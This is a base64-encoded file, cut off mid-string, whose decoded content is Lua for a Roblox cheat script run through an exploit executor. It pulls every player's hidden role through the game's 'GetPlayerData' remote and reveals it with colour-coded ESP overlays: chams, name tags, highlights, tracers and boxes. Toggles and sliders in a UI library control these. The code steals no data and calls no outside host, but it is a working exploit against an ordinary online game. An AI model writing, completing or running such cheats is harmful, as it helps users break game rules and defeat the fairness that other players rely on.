aWYgdHlwZW9mKHQxKSB+PSAidGFibGUiIHRoZW4gcmV0dXJuIHQxIH49IHQyIGVuZAogICAgZm9yIGssIHYgaW4gcGFpcnModDEpIGRvCiAgICAgICAgaWYgaXNEaWZmZXJlbnQodiwgdDJba10pIHRoZW4gcmV0dXJuIHRydWUgZW5kCiAgICBlbmQKICAgIGZvciBrLCB2IGluIHBhaXJzKHQyKSBkbwogICAgICAgIGlmIHQxW2tdID09IG5pbCB0aGVuIHJldHVybiB0cnVlIGVuZAogICAgZW5kCiAgICByZXR1cm4gZmFsc2UKZW5kCgpsb2NhbCBmdW5jdGlvbiB1cGRhdGVSb2xlcygpCiAgICBsb2NhbCBzdWNjZXNzLCBkYXRhID0gcGNhbGwoZnVuY3Rpb24oKSAKICAgICAgICByZXR1cm4gUmVwbGljYXRlZFN0b3JhZ2U6RmluZEZpcnN0Q2hpbGQoIkdldFBsYXllckRhdGEiLCB0cnVlKTpJbnZva2VTZXJ2ZXIoKSAKICAgIGVuZCkKICAgIGlmIHN1Y2Nlc3MgYW5kIGRhdGEgYW5kIGlzRGlmZmVyZW50KGRhdGEsIGxhc3REYXRhKSB0aGVuCiAgICAgICAgZ2V0Z2VudigpLlJvbGVzID0gZGF0YQogICAgICAgIGxhc3REYXRhID0gZGF0YQogICAgZW5kCiAgICB0YXNrLmRlbGF5KDEuNCwgdXBkYXRlUm9sZXMpCmVuZAoKdXBkYXRlUm9sZXMoKQoKbG9jYWwgZnVuY3Rpb24gSXNBbGl2ZShwbGF5ZXIpCiAgICBsb2NhbCByb2xlRGF0YSA9IGdldGdlbnYoKS5Sb2xlc1twbGF5ZXIuTmFtZV0KICAgIHJldHVybiByb2xlRGF0YSBhbmQgbm90IHJvbGVEYXRhLktpbGxlZCBhbmQgbm90IHJvbGVEYXRhLkRlYWQKZW5kCgpsb2NhbCBmdW5jdGlvbiBnZXRSb2xlQ29sb3IocGxheWVyKQogICAgbG9jYWwgcm9sZURhdGEgPSBnZXRnZW52KCkuUm9sZXNbcGxheWVyLk5hbWVdCiAgICBpZiByb2xlRGF0YSBhbmQgSXNBbGl2ZShwbGF5ZXIpIHRoZW4KICAgICAgICBsb2NhbCByb2xlID0gcm9sZURhdGEuUm9sZQogICAgICAgIGlmIHJvbGUgPT0gIklubm9jZW50IiB0aGVuCiAgICAgICAgICAgIHJldHVybiBDb2xvcjMuZnJvbVJHQigwLCAxMjgsIDApCiAgICAgICAgZWxzZWlmIHJvbGUgPT0gIlNoZXJpZmYiIHRoZW4KICAgICAgICAgICAgcmV0dXJuIENvbG9yMy5mcm9tUkdCKDAsIDAsIDI1NSkKICAgICAgICBlbHNlaWYgcm9sZSA9PSAiSGVybyIgdGhlbgogICAgICAgICAgICByZXR1cm4gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDApCiAgICAgICAgZWxzZWlmIHJvbGUgPT0gIk11cmRlcmVyIiB0aGVuCiAgICAgICAgICAgIHJldHVybiBDb2xvcjMuZnJvbVJHQigyNTUsIDAsIDApCiAgICAgICAgZW5kCiAgICBlbmQKICAgIHJldHVybiBDb2xvcjMuZnJvbVJHQigxNjksIDE2OSwgMTY5KQplbmQKCmxvY2FsIGNoYW1VcGRhdGVMb29wLCBjaGFtQ2xlYW51cExvb3AKbG9jYWwgZnVuY3Rpb24gYXBwbHlDaGFtRVNQKHBsYXllciwgY29sb3IpCiAgICBpZiBub3QgZ2V0Z2VudigpLkNoYW1FU1AgdGhlbiByZXR1cm4gZW5kCiAgICBsb2NhbCBjaGFyYWN0ZXIgPSBwbGF5ZXIuQ2hhcmFjdGVyCiAgICBpZiBjaGFyYWN0ZXIgdGhlbgogICAgICAgIGZvciBfLCBwYXJ0IGluIHBhaXJzKGNoYXJhY3RlcjpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICBpZiBwYXJ0OklzQSgiQmFzZVBhcnQiKSB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCBhZG9ybm1lbnQgPSBwYXJ0OkZpbmRGaXJzdENoaWxkKCJlc3BBZG9ybm1lbnQiKQogICAgICAgICAgICAgICAgaWYgbm90IGFkb3JubWVudCB0aGVuCiAgICAgICAgICAgICAgICAgICAgYWRvcm5tZW50ID0gSW5zdGFuY2UubmV3KCJCb3hIYW5kbGVBZG9ybm1lbnQiKQogICAgICAgICAgICAgICAgICAgIGFkb3JubWVudC5OYW1lID0gImVzcEFkb3JubWVudCIKICAgICAgICAgICAgICAgICAgICBhZG9ybm1lbnQuU2l6ZSA9IHBhcnQuU2l6ZQogICAgICAgICAgICAgICAgICAgIGFkb3JubWVudC5BZG9ybmVlID0gcGFydAogICAgICAgICAgICAgICAgICAgIGFkb3JubWVudC5BbHdheXNPblRvcCA9IHRydWUKICAgICAgICAgICAgICAgICAgICBhZG9ybm1lbnQuWkluZGV4ID0gNQogICAgICAgICAgICAgICAgICAgIGFkb3JubWVudC5QYXJlbnQgPSBwYXJ0CiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGFkb3JubWVudC5Db2xvcjMgPSBjb2xvcgogICAgICAgICAgICAgICAgYWRvcm5tZW50LlRyYW5zcGFyZW5jeSA9IGdldGdlbnYoKS5DaGFtVHJhbnNwYXJlbmN5CiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCmVuZAoKbG9jYWwgZnVuY3Rpb24gY2xlYXJDaGFtRVNQKCkKICAgIGZvciBfLCBwbGF5ZXIgaW4gcGFpcnMoUGxheWVyczpHZXRQbGF5ZXJzKCkpIGRvCiAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlcgogICAgICAgIGlmIGNoYXJhY3RlciB0aGVuCiAgICAgICAgICAgIGZvciBfLCBwYXJ0IGluIHBhaXJzKGNoYXJhY3RlcjpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgbG9jYWwgYWRvcm5tZW50ID0gcGFydDpGaW5kRmlyc3RDaGlsZCgiZXNwQWRvcm5tZW50IikKICAgICAgICAgICAgICAgIGlmIGFkb3JubWVudCB0aGVuCiAgICAgICAgICAgICAgICAgICAgYWRvcm5tZW50OkRlc3Ryb3koKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCmVuZAoKbG9jYWwgZnVuY3Rpb24gc3RhcnRDaGFtRVNQKCkKICAgIGlmIGNoYW1VcGRhdGVMb29wIG9yIGNoYW1DbGVhbnVwTG9vcCB0aGVuIHJldHVybiBlbmQKICAgIGNoYW1VcGRhdGVMb29wID0gdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgd2hpbGUgZ2V0Z2VudigpLkNoYW1FU1AgZG8KICAgICAgICAgICAgZm9yIF8sIHBsYXllciBpbiBwYWlycyhQbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8KICAgICAgICAgICAgICAgIGlmIHBsYXllciA9PSBMb2NhbFBsYXllciB0aGVuIGNvbnRpbnVlIGVuZAogICAgICAgICAgICAgICAgbG9jYWwgY29sb3IgPSBnZXRSb2xlQ29sb3IocGxheWVyKQogICAgICAgICAgICAgICAgYXBwbHlDaGFtRVNQKHBsYXllciwgY29sb3IpCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICB0YXNrLndhaXQoMSkKICAgICAgICBlbmQKICAgIGVuZCkKICAgIGNoYW1DbGVhbnVwTG9vcCA9IHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgIHdoaWxlIGdldGdlbnYoKS5DaGFtRVNQIGRvCiAgICAgICAgICAgIGZvciBfLCBwbGF5ZXIgaW4gcGFpcnMoUGxheWVyczpHZXRQbGF5ZXJzKCkpIGRvCiAgICAgICAgICAgICAgICBpZiBwbGF5ZXIgPT0gTG9jYWxQbGF5ZXIgdGhlbiBjb250aW51ZSBlbmQKICAgICAgICAgICAgICAgIGlmIG5vdCBJc0FsaXZlKHBsYXllcikgdGhlbgogICAgICAgICAgICAgICAgICAgIGFwcGx5Q2hhbUVTUChwbGF5ZXIsIENvbG9yMy5mcm9tUkdCKDE2OSwgMTY5LCAxNjkpKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICB0YXNrLndhaXQoMSkKICAgICAgICBlbmQKICAgIGVuZCkKZW5kCgpsb2NhbCBmdW5jdGlvbiBzdG9wQ2hhbUVTUCgpCiAgICBnZXRnZW52KCkuQ2hhbUVTUCA9IGZhbHNlCiAgICBpZiBjaGFtVXBkYXRlTG9vcCB0aGVuCiAgICAgICAgdGFzay5jYW5jZWwoY2hhbVVwZGF0ZUxvb3ApCiAgICAgICAgY2hhbVVwZGF0ZUxvb3AgPSBuaWwKICAgIGVuZAogICAgaWYgY2hhbUNsZWFudXBMb29wIHRoZW4KICAgICAgICB0YXNrLmNhbmNlbChjaGFtQ2xlYW51cExvb3ApCiAgICAgICAgY2hhbUNsZWFudXBMb29wID0gbmlsCiAgICBlbmQKICAgIGNsZWFyQ2hhbUVTUCgpCmVuZAoKbG9jYWwgZXNwTmFtZVVwZGF0ZUxvb3AsIGVzcE5hbWVDbGVhbnVwTG9vcApsb2NhbCBmdW5jdGlvbiBhcHBseUVTUE5hbWUocGxheWVyLCBjb2xvcikKICAgIGlmIG5vdCBnZXRnZW52KCkuRSB0aGVuIHJldHVybiBlbmQKICAgIGxvY2FsIGNoYXJhY3RlciA9IHBsYXllci5DaGFyYWN0ZXIKICAgIGlmIGNoYXJhY3RlciB0aGVuCiAgICAgICAgbG9jYWwgaGVhZCA9IGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSGVhZCIpCiAgICAgICAgaWYgaGVhZCB0aGVuCiAgICAgICAgICAgIGxvY2FsIGd1aSA9IGhlYWQ6RmluZEZpcnN0Q2hpbGQoIkJpbGxib2FyZEd1aSIpCiAgICAgICAgICAgIGxvY2FsIHRleHRMYWJlbAogICAgICAgICAgICBpZiBub3QgZ3VpIHRoZW4KICAgICAgICAgICAgICAgIGd1aSA9IEluc3RhbmNlLm5ldygiQmlsbGJvYXJkR3VpIikKICAgICAgICAgICAgICAgIGd1aS5QYXJlbnQgPSBoZWFkCiAgICAgICAgICAgICAgICBndWkuQWRvcm5lZSA9IGhlYWQKICAgICAgICAgICAgICAgIGd1aS5TaXplID0gVURpbTIubmV3KDAsIDY1LCAwLCA2NSkKICAgICAgICAgICAgICAgIGd1aS5TdHVkc09mZnNldCA9IFZlY3RvcjMubmV3KDAsIDQsIDApCiAgICAgICAgICAgICAgICBndWkuQWx3YXlzT25Ub3AgPSB0cnVlCiAgICAgICAgICAgICAgICBndWkuUmVzZXRPblNwYXduID0gZmFsc2UKICAgICAgICAgICAgICAgIGd1aS5FbmFibGVkID0gdHJ1ZQogICAgICAgICAgICAgICAgdGV4dExhYmVsID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiKQogICAgICAgICAgICAgICAgdGV4dExhYmVsLlBhcmVudCA9IGd1aQogICAgICAgICAgICAgICAgdGV4dExhYmVsLlNpemUgPSBVRGltMi5uZXcoMCwgNjUsIDAsIDY1KQogICAgICAgICAgICAgICAgdGV4dExhYmVsLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICAgICAgICAgICAgICB0ZXh0TGFiZWwuVGV4dFNjYWxlZCA9IHRydWUKICAgICAgICAgICAgICAgIHRleHRMYWJlbC5UZXh0ID0gcGxheWVyLk5hbWUKICAgICAgICAgICAgICAgIHRleHRMYWJlbC5UZXh0U2l6ZSA9IDExCiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIHRleHRMYWJlbCA9IGd1aTpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIlRleHRMYWJlbCIpCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICBpZiB0ZXh0TGFiZWwgdGhlbgogICAgICAgICAgICAgICAgdGV4dExhYmVsLlRleHRDb2xvcjMgPSBjb2xvcgogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAplbmQKCmxvY2FsIGZ1bmN0aW9uIGNsZWFyRVNQTmFtZSgpCiAgICBmb3IgXywgcGxheWVyIGluIHBhaXJzKFBsYXllcnM6R2V0UGxheWVycygpKSBkbwogICAgICAgIGxvY2FsIGNoYXJhY3RlciA9IHBsYXllci5DaGFyYWN0ZXIKICAgICAgICBpZiBjaGFyYWN0ZXIgdGhlbgogICAgICAgICAgICBsb2NhbCBoZWFkID0gY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIZWFkIikKICAgICAgICAgICAgaWYgaGVhZCB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCBndWkgPSBoZWFkOkZpbmRGaXJzdENoaWxkKCJCaWxsYm9hcmRHdWkiKQogICAgICAgICAgICAgICAgaWYgZ3VpIHRoZW4KICAgICAgICAgICAgICAgICAgICBndWk6RGVzdHJveSgpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKZW5kCgpsb2NhbCBmdW5jdGlvbiBzdGFydEVTUE5hbWUoKQogICAgaWYgZXNwTmFtZVVwZGF0ZUxvb3Agb3IgZXNwTmFtZUNsZWFudXBMb29wIHRoZW4gcmV0dXJuIGVuZAogICAgZXNwTmFtZVVwZGF0ZUxvb3AgPSB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICB3aGlsZSBnZXRnZW52KCkuRSBkbwogICAgICAgICAgICBmb3IgXywgcGxheWVyIGluIHBhaXJzKFBsYXllcnM6R2V0UGxheWVycygpKSBkbwogICAgICAgICAgICAgICAgaWYgcGxheWVyID09IExvY2FsUGxheWVyIHRoZW4gY29udGludWUgZW5kCiAgICAgICAgICAgICAgICBsb2NhbCBjb2xvciA9IGdldFJvbGVDb2xvcihwbGF5ZXIpCiAgICAgICAgICAgICAgICBhcHBseUVTUE5hbWUocGxheWVyLCBjb2xvcikKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIHRhc2sud2FpdCgxKQogICAgICAgIGVuZAogICAgZW5kKQogICAgZXNwTmFtZUNsZWFudXBMb29wID0gdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgd2hpbGUgZ2V0Z2VudigpLkUgZG8KICAgICAgICAgICAgZm9yIF8sIHBsYXllciBpbiBwYWlycyhQbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8KICAgICAgICAgICAgICAgIGlmIHBsYXllciA9PSBMb2NhbFBsYXllciB0aGVuIGNvbnRpbnVlIGVuZAogICAgICAgICAgICAgICAgaWYgbm90IElzQWxpdmUocGxheWVyKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgYXBwbHlFU1BOYW1lKHBsYXllciwgQ29sb3IzLmZyb21SR0IoMTY5LCAxNjksIDE2OSkpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIHRhc2sud2FpdCgxKQogICAgICAgIGVuZAogICAgZW5kKQplbmQKCmxvY2FsIGZ1bmN0aW9uIHN0b3BFU1BOYW1lKCkKICAgIGdldGdlbnYoKS5FID0gZmFsc2UKICAgIGlmIGVzcE5hbWVVcGRhdGVMb29wIHRoZW4KICAgICAgICB0YXNrLmNhbmNlbChlc3BOYW1lVXBkYXRlTG9vcCkKICAgICAgICBlc3BOYW1lVXBkYXRlTG9vcCA9IG5pbAogICAgZW5kCiAgICBpZiBlc3BOYW1lQ2xlYW51cExvb3AgdGhlbgogICAgICAgIHRhc2suY2FuY2VsKGVzcE5hbWVDbGVhbnVwTG9vcCkKICAgICAgICBlc3BOYW1lQ2xlYW51cExvb3AgPSBuaWwKICAgIGVuZAogICAgY2xlYXJFU1BOYW1lKCkKZW5kCgpsb2NhbCBoaWdobGlnaHRVcGRhdGVMb29wLCBoaWdobGlnaHRDbGVhbnVwTG9vcApsb2NhbCBmdW5jdGlvbiBhcHBseUhpZ2hsaWdodChwbGF5ZXIsIGZpbGxDb2xvciwgb3V0bGluZUNvbG9yKQogICAgaWYgbm90IGdldGdlbnYoKS5IIHRoZW4gcmV0dXJuIGVuZAogICAgbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlcgogICAgaWYgY2hhcmFjdGVyIGFuZCBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSB0aGVuCiAgICAgICAgbG9jYWwgaGlnaGxpZ2h0ID0gY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIaWdobGlnaHQiKQogICAgICAgIGlmIG5vdCBoaWdobGlnaHQgdGhlbgogICAgICAgICAgICBoaWdobGlnaHQgPSBJbnN0YW5jZS5uZXcoIkhpZ2hsaWdodCIpCiAgICAgICAgICAgIGhpZ2hsaWdodC5QYXJlbnQgPSBjaGFyYWN0ZXIKICAgICAgICBlbmQKICAgICAgICBoaWdobGlnaHQuRmlsbENvbG9yID0gZmlsbENvbG9yCiAgICAgICAgaGlnaGxpZ2h0LkZpbGxUcmFuc3BhcmVuY3kgPSBnZXRnZW52KCkuRgogICAgICAgIGhpZ2hsaWdodC5PdXRsaW5lQ29sb3IgPSBvdXRsaW5lQ29sb3IKICAgIGVuZAplbmQKCmxvY2FsIGZ1bmN0aW9uIGNsZWFySGlnaGxpZ2h0KCkKICAgIGZvciBfLCBwbGF5ZXIgaW4gcGFpcnMoUGxheWVyczpHZXRQbGF5ZXJzKCkpIGRvCiAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlcgogICAgICAgIGlmIGNoYXJhY3RlciB0aGVuCiAgICAgICAgICAgIGxvY2FsIGhpZ2hsaWdodCA9IGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSGlnaGxpZ2h0IikKICAgICAgICAgICAgaWYgaGlnaGxpZ2h0IHRoZW4KICAgICAgICAgICAgICAgIGhpZ2hsaWdodDpEZXN0cm95KCkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKZW5kCgpsb2NhbCBmdW5jdGlvbiBzdGFydEVTUEhpZ2hsaWdodCgpCiAgICBpZiBoaWdobGlnaHRVcGRhdGVMb29wIG9yIGhpZ2hsaWdodENsZWFudXBMb29wIHRoZW4gcmV0dXJuIGVuZAogICAgaGlnaGxpZ2h0VXBkYXRlTG9vcCA9IHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgIHdoaWxlIGdldGdlbnYoKS5IIGRvCiAgICAgICAgICAgIGZvciBfLCBwbGF5ZXIgaW4gcGFpcnMoUGxheWVyczpHZXRQbGF5ZXJzKCkpIGRvCiAgICAgICAgICAgICAgICBpZiBwbGF5ZXIgPT0gTG9jYWxQbGF5ZXIgdGhlbiBjb250aW51ZSBlbmQKICAgICAgICAgICAgICAgIGxvY2FsIGNvbG9yID0gZ2V0Um9sZUNvbG9yKHBsYXllcikKICAgICAgICAgICAgICAgIGFwcGx5SGlnaGxpZ2h0KHBsYXllciwgY29sb3IsIGNvbG9yKQogICAgICAgICAgICBlbmQKICAgICAgICAgICAgdGFzay53YWl0KDEpCiAgICAgICAgZW5kCiAgICBlbmQpCiAgICBoaWdobGlnaHRDbGVhbnVwTG9vcCA9IHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgIHdoaWxlIGdldGdlbnYoKS5IIGRvCiAgICAgICAgICAgIGZvciBfLCBwbGF5ZXIgaW4gcGFpcnMoUGxheWVyczpHZXRQbGF5ZXJzKCkpIGRvCiAgICAgICAgICAgICAgICBpZiBwbGF5ZXIgPT0gTG9jYWxQbGF5ZXIgdGhlbiBjb250aW51ZSBlbmQKICAgICAgICAgICAgICAgIGlmIG5vdCBJc0FsaXZlKHBsYXllcikgdGhlbgogICAgICAgICAgICAgICAgICAgIGFwcGx5SGlnaGxpZ2h0KHBsYXllciwgQ29sb3IzLmZyb21SR0IoMTY5LCAxNjksIDE2OSksIENvbG9yMy5mcm9tUkdCKDE2OSwgMTY5LCAxNjkpKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICB0YXNrLndhaXQoMSkKICAgICAgICBlbmQKICAgIGVuZCkKZW5kCgpsb2NhbCBmdW5jdGlvbiBzdG9wRVNQSGlnaGxpZ2h0KCkKICAgIGdldGdlbnYoKS5IID0gZmFsc2UKICAgIGlmIGhpZ2hsaWdodFVwZGF0ZUxvb3AgdGhlbgogICAgICAgIHRhc2suY2FuY2VsKGhpZ2hsaWdodFVwZGF0ZUxvb3ApCiAgICAgICAgaGlnaGxpZ2h0VXBkYXRlTG9vcCA9IG5pbAogICAgZW5kCiAgICBpZiBoaWdobGlnaHRDbGVhbnVwTG9vcCB0aGVuCiAgICAgICAgdGFzay5jYW5jZWwoaGlnaGxpZ2h0Q2xlYW51cExvb3ApCiAgICAgICAgaGlnaGxpZ2h0Q2xlYW51cExvb3AgPSBuaWwKICAgIGVuZAogICAgY2xlYXJIaWdobGlnaHQoKQplbmQKCmxvY2FsIHRyYWNlckRyYXdpbmdzID0ge30KUnVuU2VydmljZS5SZW5kZXJTdGVwcGVkOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgaWYgbm90IGdldGdlbnYoKS5UIHRoZW4KICAgICAgICBmb3IgXywgbGluZSBpbiBwYWlycyh0cmFjZXJEcmF3aW5ncykgZG8KICAgICAgICAgICAgbGluZS5WaXNpYmxlID0gZmFsc2UKICAgICAgICBlbmQKICAgICAgICByZXR1cm4KICAgIGVuZAogICAgbG9jYWwgY2FtZXJhID0gd29ya3NwYWNlLkN1cnJlbnRDYW1lcmEKICAgIGxvY2FsIGN4ID0gY2FtZXJhLlZpZXdwb3J0U2l6ZS5YIC8gMgogICAgbG9jYWwgY3kgPSBjYW1lcmEuVmlld3BvcnRTaXplLlkKICAgIGZvciBfLCBwbGF5ZXIgaW4gcGFpcnMoUGxheWVyczpHZXRQbGF5ZXJzKCkpIGRvCiAgICAgICAgaWYgcGxheWVyID09IExvY2FsUGxheWVyIG9yIG5vdCBwbGF5ZXIuQ2hhcmFjdGVyIHRoZW4gY29udGludWUgZW5kCiAgICAgICAgbG9jYWwgaHJwID0gcGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgbG9jYWwgaHVtYW5vaWQgPSBwbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZCIpCiAgICAgICAgaWYgaHJwIGFuZCBodW1hbm9pZCBhbmQgaHVtYW5vaWQuSGVhbHRoID4gMCB0aGVuCiAgICAgICAgICAgIGxvY2FsIHNjcmVlblBvcywgb25TY3JlZW4gPSBjYW1lcmE6V29ybGRUb1ZpZXdwb3J0UG9pbnQoaHJwLlBvc2l0aW9uKQogICAgICAgICAgICBpZiBvblNjcmVlbiB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCBsaW5lID0gdHJhY2VyRHJhd2luZ3NbcGxheWVyXQogICAgICAgICAgICAgICAgaWYgbm90IGxpbmUgdGhlbgogICAgICAgICAgICAgICAgICAgIGxpbmUgPSBEcmF3aW5nLm5ldygiTGluZSIpCiAgICAgICAgICAgICAgICAgICAgdHJhY2VyRHJhd2luZ3NbcGxheWVyXSA9IGxpbmUKICAgICAgICAgICAgICAgICAgICBsaW5lLlRoaWNrbmVzcyA9IDEKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgbGluZS5Gcm9tID0gVmVjdG9yMi5uZXcoY3gsIGN5KQogICAgICAgICAgICAgICAgbGluZS5UbyA9IFZlY3RvcjIubmV3KHNjcmVlblBvcy5YLCBzY3JlZW5Qb3MuWSkKICAgICAgICAgICAgICAgIGxpbmUuQ29sb3IgPSBnZXRSb2xlQ29sb3IocGxheWVyKQogICAgICAgICAgICAgICAgbGluZS5WaXNpYmxlID0gdHJ1ZQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICBpZiB0cmFjZXJEcmF3aW5nc1twbGF5ZXJdIHRoZW4KICAgICAgICAgICAgICAgICAgICB0cmFjZXJEcmF3aW5nc1twbGF5ZXJdLlZpc2libGUgPSBmYWxzZQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVsc2VpZiB0cmFjZXJEcmF3aW5nc1twbGF5ZXJdIHRoZW4KICAgICAgICAgICAgdHJhY2VyRHJhd2luZ3NbcGxheWVyXTpSZW1vdmUoKQogICAgICAgICAgICB0cmFjZXJEcmF3aW5nc1twbGF5ZXJdID0gbmlsCiAgICAgICAgZW5kCiAgICBlbmQKZW5kKQoKUGxheWVycy5QbGF5ZXJSZW1vdmluZzpDb25uZWN0KGZ1bmN0aW9uKHBsYXllcikKICAgIGlmIHRyYWNlckRyYXdpbmdzW3BsYXllcl0gdGhlbgogICAgICAgIHRyYWNlckRyYXdpbmdzW3BsYXllcl06UmVtb3ZlKCkKICAgICAgICB0cmFjZXJEcmF3aW5nc1twbGF5ZXJdID0gbmlsCiAgICBlbmQKZW5kKQoKbG9jYWwgZnVuY3Rpb24gZHJhd0VTUEJveChwbGF5ZXIpCiAgICBpZiBwbGF5ZXIgPT0gTG9jYWxQbGF5ZXIgdGhlbiByZXR1cm4gZW5kCiAgICBsb2NhbCBib3ggPSBEcmF3aW5nLm5ldygiU3F1YXJlIikKICAgIGJveC5WaXNpYmxlID0gZmFsc2UKICAgIGJveC5UaGlja25lc3MgPSAxCiAgICBib3guRmlsbGVkID0gZmFsc2UKICAgIGxvY2FsIGZ1bmN0aW9uIHVwZGF0ZUJveCgpCiAgICAgICAgUnVuU2VydmljZS5SZW5kZXJTdGVwcGVkOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICBpZiBub3QgZ2V0Z2VudigpLmVCIG9yIG5vdCBwbGF5ZXIuQ2hhcmFjdGVyIG9yIG5vdCBwbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikgdGhlbgogICAgICAgICAgICAgICAgYm94LlZpc2libGUgPSBmYWxzZQogICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICBsb2NhbCBjYW1lcmEgPSB3b3Jrc3BhY2UuQ3VycmVudENhbWVyYQogICAgICAgICAgICBsb2NhbCBocnAgPSBwbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICAgICAgbG9jYWwgc2NyZWVuUG9zLCBvblNjcmVlbiA9IGNhbWVyYTpXb3JsZFRvVmlld3BvcnRQb2ludChocnAuUG9zaXRpb24pCiAgICAgICAgICAgIGlmIG9uU2NyZWVuIHRoZW4KICAgICAgICAgICAgICAgIGJveC5TaXplID0gVmVjdG9yMi5uZXcoMTAwMCAvIHNjcmVlblBvcy5aLCAxNTAwIC8gc2NyZWVuUG9zLlopCiAgICAgICAgICAgICAgICBib3guUG9zaXRpb24gPSBWZWN0b3IyLm5ldyhzY3JlZW5Qb3MuWCAtIGJveC5TaXplLlggLyAyLCBzY3JlZW5Qb3MuWSAtIGJveC5TaXplLlkgLyAyKQogICAgICAgICAgICAgICAgYm94LkNvbG9yID0gZ2V0Um9sZUNvbG9yKHBsYXllcikKICAgICAgICAgICAgICAgIGJveC5WaXNpYmxlID0gdHJ1ZQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICBib3guVmlzaWJsZSA9IGZhbHNlCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKICAgIGVuZAogICAgY29yb3V0aW5lLndyYXAodXBkYXRlQm94KSgpCmVuZAoKZm9yIF8sIHBsYXllciBpbiBwYWlycyhQbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8KICAgIGRyYXdFU1BCb3gocGxheWVyKQplbmQKClBsYXllcnMuUGxheWVyQWRkZWQ6Q29ubmVjdChmdW5jdGlvbihwbGF5ZXIpCiAgICBkcmF3RVNQQm94KHBsYXllcikKZW5kKQoKTGlicmFyeS5hZGRUb2dnbGUodGFiMywgIkVTUCBCb3giLCAiIiwgZ2V0Z2VudigpLmVCLCBmdW5jdGlvbihzdGF0ZSkKICAgIGdldGdlbnYoKS5lQiA9IHN0YXRlCiAgICBnZXRnZW52KCkuc2F2ZWRDb25maWcuZUIgPSBzdGF0ZQogICAgZ2V0Z2VudigpLnNhdmVDb25maWcoZ2V0Z2VudigpLnNhdmVkQ29uZmlnKQplbmQpCgpMaWJyYXJ5LmFkZFRvZ2dsZSh0YWIzLCAiQ2hhbSBFU1AiLCAiIiwgZ2V0Z2VudigpLkNoYW1FU1AsIGZ1bmN0aW9uKHN0YXRlKQogICAgZ2V0Z2VudigpLkNoYW1FU1AgPSBzdGF0ZQogICAgZ2V0Z2VudigpLnNhdmVkQ29uZmlnLkNoYW1FU1AgPSBzdGF0ZQogICAgZ2V0Z2VudigpLnNhdmVDb25maWcoZ2V0Z2VudigpLnNhdmVkQ29uZmlnKQogICAgaWYgc3RhdGUgdGhlbgogICAgICAgIHN0YXJ0Q2hhbUVTUCgpCiAgICBlbHNlCiAgICAgICAgc3RvcENoYW1FU1AoKQogICAgZW5kCmVuZCkKCkxpYnJhcnkuYWRkU2xpZGVyKHRhYjMsICJDaGFtIEVTUCBUcmFuc3BhcmVuY3kiLCAiQ2hhbSBFU1AgVHJhbnNwYXJlbmN5IiwgMCwgMTAwLCBnZXRnZW52KCkuQ2hhbVRyYW5zcGFyZW5jeSAqIDEwMCwgZnVuY3Rpb24odmFsdWUpCiAgICBnZXRnZW52KCkuQ2hhbVRyYW5zc